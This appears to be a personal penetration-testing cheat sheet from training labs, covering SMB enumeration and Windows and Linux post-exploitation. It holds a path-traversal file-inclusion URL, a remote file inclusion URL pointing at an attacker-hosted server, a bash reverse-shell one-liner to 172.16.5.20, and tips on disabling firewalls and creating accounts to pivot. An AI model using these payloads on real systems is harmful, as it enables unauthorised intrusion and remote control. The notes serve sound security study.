# Pentest-Notes
Some notes for myself

## Windows exploitation

### SMB enum

enum4linux hasn't worked too well.

May have to edit `/etc/samba/smb.conf` to add
```
   client min protocol = CORE
   client max protocol = SMB3
```

Try this with `smbclient`:

```
smbclient -L 10.130.40.70

smbclient -U''%'' -L 10.130.40.70

smbclient --no-pass -L //172.30.111.10
```

Use `smbmap` to map the folders and permissions first, then see what you have access to access with smbclient.

```
smbmap -u test -p 12345 -H 10.130.40.70
smbclient -U 'test%12345' //10.130.40.70/Documents
```
or mount it first then browse
### Web

Check we can do LFI (include null byte terminator if necessary)

`http://members.foocompany.com/index.php?pag=//..//..//..//..//..//..//..//Windows//system32//drivers//etc//hosts%00`

See more here
https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/

Check for RFI
`http://members.foocompany.com/index.php?pag=http://172.16.5.20:8000/`

Host dir with `python3 -m http.server`

## Windows post-exp

winPEAS requires .NET4, check what .NET is installed first.

Drop `nmap.exe` on windows target to enum, scan ports. Specify `-sT` option.

Get RDP if possible easier to enum with that.

Use robocopy for transferring files from SMBserver

arp-scan.exe for discovering hosts on same subnet

Fping.exe for scanning outside networks. Here Fping from .1 to .254
```
C:\Temp>Fping.exe -g 172.30.111.1/172.30.111.254
Fping.exe -g 172.30.111.1/172.30.111.254

Fast pinger version 3.00
(c) Wouter Dhondt (http://www.kwakkelflap.com)

```
Disable FW if possible

If you can't `net use` a shared folder, enable File and Printer via RDP, reboot if necessary.

If you encounter error `A specified logon session does not exist.`, do [this](https://superuser.com/questions/968879/windows-10-map-network-drive-a-specified-logon-session-does-not-exist/1126123#1126123)

Robocopy syntax

```
C:\Temp\SSFWin32>robocopy \\172.16.10.5\lab9 C:\Temp\SSFWin32 /e
```
If need to pivot from Windows, and have problems with existing accounts, create account and net use with creds
```
net use \\10.100.11.101\pivot /user:admin Password1
```

Use `rmdir` to delete recursively on Windows

```
C:\Tmp>rmdir SSFWin32\SSF-Win32 /s /q
rmdir SSFWin32\SSF-Win32 /s /q
```

## Linux exploitation

If you can do RCE try
`nohup bash 'bash -i >& /dev/tcp/172.16.5.20/53 0>&1' &`

## Linux post-exp

To see cron jobs pertaining to your user
`crontab -l` 

Copying files from Linux and want to see progress? Use `rysnc`

```
root@Kali:~/PTP/Labs/Lab20# rsync -ah --progress /root/Tools/SSF-Win32 /mnt/pivot/SSFWin32
sending incremental file list
created directory /mnt/pivot/SSFWin32
```
